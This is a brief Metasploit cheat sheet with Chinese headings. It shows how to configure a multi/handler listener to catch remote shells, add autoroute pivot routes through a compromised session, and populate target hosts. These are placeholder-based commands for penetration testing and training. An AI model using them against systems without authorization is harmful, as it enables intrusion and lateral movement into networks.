# Metasploit常用

### Metasploit Handler 监听shell

```bash
use exploit/multi/handler
set PAYLOAD <Payload name>
Set RHOST <Remote IP>
set LHOST <Local IP>
set LPORT <Local Port>
run -j
```

### 添加路由表

```bash
run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
run autoroute -s 10.10.10.1/24
```

### set rhosts from hosts&#x20;

```bash
hosts -R 
```
